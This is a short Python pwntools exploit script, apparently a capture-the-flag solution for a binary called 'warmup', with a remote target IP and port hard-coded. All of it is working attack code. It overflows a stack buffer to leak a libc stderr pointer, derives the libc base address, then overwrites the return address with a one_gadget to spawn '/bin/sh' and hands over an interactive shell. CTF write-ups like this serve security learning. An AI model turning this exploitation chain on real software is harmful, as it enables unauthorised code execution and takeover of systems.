#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

exe = ELF('./warmup')
libc = ELF('./libc.so.6')

host, port = "141.164.48.191", "10001"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)


# 1st round , set rbx = 0x601018 point 8bytes before stderr address on .bss
payload = 'A'*0x30+p64(0x601018)+p64(0x40055d)+p64(0)*6
#Â 2nd round, now rsi will point to 0x601018 (that we pass at the 1st round in rbx, and we will dump stderr value)
payload += p64(0x601018)+p64(0x40055d)+p64(0)*6+p64(0x601018)+p64(0x40053d)

p.sendafter('> ', payload)
buff  = p.recv(0xc0)

# write 8 bytes just before stderr address on .bss
p.send('A'*8)
# receive out stderr leak
buff  = p.recv(0xc0)
print(hexdump(buff))
leak = u64(buff[0x8:0x10])
print('leak = '+hex(leak))
libc.address = leak - libc.symbols['_IO_2_1_stderr_']
print('libc.address = '+hex(libc.address))

# write again 8 bytes just before stderr address on .bss
p.send('A'*8)

# now that we know remote libc mapping address, we send a onegadget for our final payload, that will do system('/bin/sh')
onegadgets = one_gadget('libc.so.6', libc.address)
payload = 'A'*0x30+p64(0x601018)+p64(onegadgets[1])+p64(0)*10
p.sendafter('> ', payload)

# enjoy shell
p.interactive()

